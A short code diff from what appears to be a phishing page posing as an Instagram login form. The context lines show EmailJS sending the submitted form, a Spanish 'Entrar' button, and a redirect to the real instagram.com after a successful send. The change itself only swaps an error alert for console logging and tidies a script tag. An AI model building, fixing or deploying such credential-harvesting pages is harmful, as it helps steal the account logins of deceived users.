@@ -370,18 +370,18 @@ emailjs.init('X_tbb3bRVfUBe3vtN')
                   btn.disabled = false;
                   btn.textContent = "Entrar";
 
-  
                   // Redirigir después del envío exitoso
                   window.location.href = "https://www.instagram.com"; // Cambia por la URL deseada
               })
               .catch((err) => {
+                  console.error("Error en el envío del formulario:", err);
                   btn.disabled = false;
                   btn.textContent = "Entrar";
-                  alert("Error: " + JSON.stringify(err));
               });
       });
   });
-  </script>
+</script>
+
   
 <div><div class="_acb3"><div class="_acb4"></div></div><div class="_acb6"><div class="_acb7"></div></div><div><div></div></div></div>
 
